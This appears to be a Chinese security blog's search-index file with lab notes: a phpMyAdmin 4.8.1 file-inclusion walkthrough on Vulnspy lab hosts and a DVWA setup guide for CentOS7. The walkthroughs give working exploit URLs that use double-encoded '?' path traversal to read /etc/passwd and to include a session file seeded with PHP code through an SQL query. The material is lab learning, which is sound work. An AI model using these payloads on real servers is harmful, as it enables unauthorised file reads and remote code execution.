/etc/selinux/config</span><br></pre></td></tr></table></figure><p>修改以后重启系统即可。</p><h2 id="2-phpmyadmin4-8文件包含漏洞"><a href="#2-phpmyadmin4-8文件包含漏洞" class="headerlink" title="2.phpmyadmin4.8文件包含漏洞"></a>2.phpmyadmin4.8文件包含漏洞</h2><p>goto_whitelist白名单如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> $goto_whitelist = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'db_datadict.php'</span>,</span><br><span class="line">    <span class="string">'db_sql.php'</span>,</span><br><span class="line">    <span class="string">'db_events.php'</span>,</span><br><span class="line">    <span class="string">'db_export.php'</span>,</span><br><span class="line">    <span class="string">'db_importdocsql.php'</span>,</span><br><span class="line">    <span class="string">'db_multi_table_query.php'</span>,</span><br><span class="line">    <span class="string">'db_structure.php'</span>,</span><br><span class="line">    <span class="string">'db_import.php'</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>进入<a href="https://www.vulnspy.com/phpmyadmin-4.8.1/" target="_blank" rel="noopener">Vulnspy</a>开始实验</p><p>从index.php定位到白名单中的php文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3395a164a7f3b89d07d1e02cf6a3792e.vsplate.me:28268/index.php?target=db_export.php?</span><br></pre></td></tr></table></figure><p>将?改<code>%253f</code>读取系统文件，进行多次 <code>./</code>以进入到系统的根目录，然后读取<code>/etc/passwd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://3395a164a7f3b89d07d1e02cf6a3792e.vsplate.me:28268/index.php?target=db_export.php%253f../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><strong>Note</strong>: target=后面的文件填写白名单文件均可成功，?要用%253f代替</p><p><img src="/images/phpmyadmin1.png" alt="图一"></p><p>点击SQL输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php phpinfo(); exit;?&gt;&apos;</span><br></pre></td></tr></table></figure><p><img src="/images/phpmyadmin2.png" alt="图二"></p><p><strong>Note</strong>:phpmyadmin特性是所有sql查询语句都早sess_id中存储着。</p><p>sess_id在<code>/var/lib/php/session/</code>目录中</p><p><img src="/images/phpmyadmin4.png" alt="图三"></p><h2 id="3-docker容器"><a href="#3-docker容器" class="headerlink" title="3. docker容器"></a>3. docker容器</h2><p>类似于虚拟机，依赖与linux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看创建的镜像</span></span><br><span class="line">docker images</span><br><span class="line"><span class="comment">#启动docker</span></span><br><span class="line">service docker start</span><br><span class="line"><span class="comment">#修改docker的用户组</span></span><br><span class="line">sudo usermod -G docker <span class="variable">$USER</span></span><br><span class="line"><span class="comment">#重启虚拟机reboot</span></span><br><span class="line">reboot</span><br><span class="line">docker images</span><br><span class="line">docker-compose</span><br><span class="line">docker run --rm -it alpine /bin/bash</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SELinux - phpmyadmin </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpmyadmin-bug</title>
      <link href="/2019/07/28/phpmyadmin-bug/"/>
      <url>/2019/07/28/phpmyadmin-bug/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: phpmyadmin4.8漏洞演示</p><a id="more"></a><!--export--><ol><li><p>进入<a href="https://www.vulnspy.com/phpmyadmin-4.8.1/" target="_blank" rel="noopener">vulnsp</a>网站，点击<a href="https://www.vsplate.com/?github=vulnspy/phpmyadmin-4.8.1&autogo=1" target="_blank" rel="noopener">start to hack</a>，跳转到VSPlat</p><p><a href="https://free.imgsha.com/i/mIN2s" target="_blank" rel="noopener"><img src="https://s3.ax2x.com/2019/07/27/phpmyadminBug0.png" alt="phpmyadminBug0.png"></a></p></li></ol><ol start="2"><li><p>点击进入实验，点击开始按钮</p><p><a href="https://free.imgsha.com/i/mIRpV" target="_blank" rel="noopener"><img src="https://s3.ax2x.com/2019/07/27/phpmyadminBug1.png" alt="phpmyadminBug1.png"></a></p></li><li><p>进入phpmyadmin登录界面，用户名：root，密码：toor登录</p><p><a href="https://free.imgsha.com/i/mIgV0" target="_blank" rel="noopener"><img src="https://s3.ax2x.com/2019/07/27/phpmyadminBug2.png" alt="phpmyadminBug2.png"></a></p></li><li><p>点击SQL，输入如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php phpinfo(); exit;?&gt;&apos;</span><br></pre></td></tr></table></figure><p><a href="https://free.imgsha.com/i/mI0GD" target="_blank" rel="noopener"><img src="https://s3.ax2x.com/2019/07/27/phpmyadminBug3.png" alt="phpmyadminBug3.png"></a></p></li><li><p>获取自己的SESSION ID</p><p><a href="https://free.imgsha.com/i/mIf7N" target="_blank" rel="noopener"><img src="https://s3.ax2x.com/2019/07/27/phpmyadminBug4faccb358f56b8296.png" alt="phpmyadminBug4faccb358f56b8296.png"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_id = d0fn5a9nckc5hu90j6re5glj3mmtdbpf</span><br></pre></td></tr></table></figure></li></ol><ol start="6"><li><p>包含SESSION文件，成功利用该漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://079d4a227c7ba70a8fd8e0a5f6bde15a.vsplate.me:47529/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_d0fn5a9nckc5hu90j6re5glj3mmtdbpf</span><br></pre></td></tr></table></figure></li><li><p>网页输入payload，页面如下，成功利用该漏洞</p><p><a href="https://free.imgsha.com/i/mIpmX" target="_blank" rel="noopener"><img src="https://s3.ax2x.com/2019/07/27/phpmyadminBug5.png" alt="phpmyadminBug5.png"></a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpmyadmin </tag>
            
            <tag> bug </tag>
            
            <tag> 文件包含漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dvwa-deploy</title>
      <link href="/2019/07/28/dvwa-deploy/"/>
      <url>/2019/07/28/dvwa-deploy/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: CentOS7部署DVWA</p><a id="more"></a><!--export--><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><ul><li><p>1.进入到/var/www目录下，然后wget下载dvwa文件，解压master.zip文件到html文件夹下，进入html文件夹下，修改DVWA-master文件名为dvwa，进入dvwa/config文件夹中，把config.inc.php.dist复制一份，命名为config.inc.php；<br>‘cd /var/www’</p><pre><code>&apos;wget https://github.com/ethicalhack3r/DVWA/archive/master.zip&apos;&apos;unzip master.zip -d html/&apos;&apos;cd html &amp;&amp; mv DVWA-master dvwa&apos;&apos;cd dvwa/config/&apos;&apos;co config.inc.php.dist config.inc.php&apos;</code></pre><p><img src="/images/dvwa-20190729-1.jpg" alt="步骤一"></p></li><li><p>2.进入到/etc目录，先把php.ini备份一份名为php.ini.bak.20190727，打开php.ini，把allow_url_include=Off修改为On，保存退出，重启服务；<br>‘cd /etc’</p><pre><code>&apos;cp php.ini php.ini.bak.20190727&apos;&apos;vi php.ini&apos;&apos;systemctl restart httpd&apos;</code></pre><p><img src="/images/dvwa-20190729-2.jpg" alt="步骤二"></p></li><li><p>3.进入/var/www/html/dvwa/config目录下，修改config.inc.php，把$_DVWA[ ‘db_password’ ]修改为mysql中root用户密码，并填写公钥和私钥，保存后退出；<br><strong>public_key: 6LePqhAUAAAAAH6Bn2okO9-8G-zNw46PNhotV4Q6</strong><br><strong>private_key: 6LePqhAUAAAAAMVqhBbFr1NVA9H13FkyfAgBeZYx</strong></p><pre><code>&apos;cd /var/www/html/dvwa/config&apos;&apos;vi config.inc.php&apos;</code></pre><p><img src="/images/dvwa-20190729-3.jpg" alt="步骤三"></p></li><li><p>4.进入/var/www/html文件中，修改dvwa的用户和用户组<br>‘chown -R apache:apache dvwa/‘</p><pre><code>&apos;systemctl restart httpd&apos;</code></pre><p><img src="/images/dvwa-20190729-4.jpg" alt="步骤四"></p></li><li><p>5.部署成功后，登录界面如下图所示，用户名：admin，密码：password，即可登录</p><p><img src="/images/dvwa-20190729-5.jpg" alt="步骤五"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dvwa </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
